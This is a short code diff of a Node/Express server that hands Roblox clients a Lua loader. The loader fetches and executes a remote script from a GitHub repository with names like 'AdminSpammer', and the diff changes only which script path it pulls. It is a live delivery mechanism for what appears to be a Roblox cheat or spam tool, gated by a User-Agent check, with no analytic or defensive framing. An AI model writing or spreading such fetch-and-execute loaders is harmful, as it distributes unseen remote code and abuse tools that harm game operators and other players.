@@ -3,7 +3,7 @@ const app = express();
 const port = process.env.PORT || 3000;
 
 // Le script Lua à renvoyer au client (Roblox)
-const luaScript = `loadstring(game:HttpGet("https://raw.githubusercontent.com/plantapi662-lab/APSPAMMERSAB/refs/heads/main/AdminSpammerPC"))()`;
+const luaScript = `loadstring(game:HttpGet("https://raw.githubusercontent.com/plantapi662-lab/APSPAMMERSAB/refs/heads/main/apspampcmob"))()`;
 
 app.get("/", (req, res) => {
   // Vérifie l'en-tête 'User-Agent' pour savoir si la requête provient de Roblox
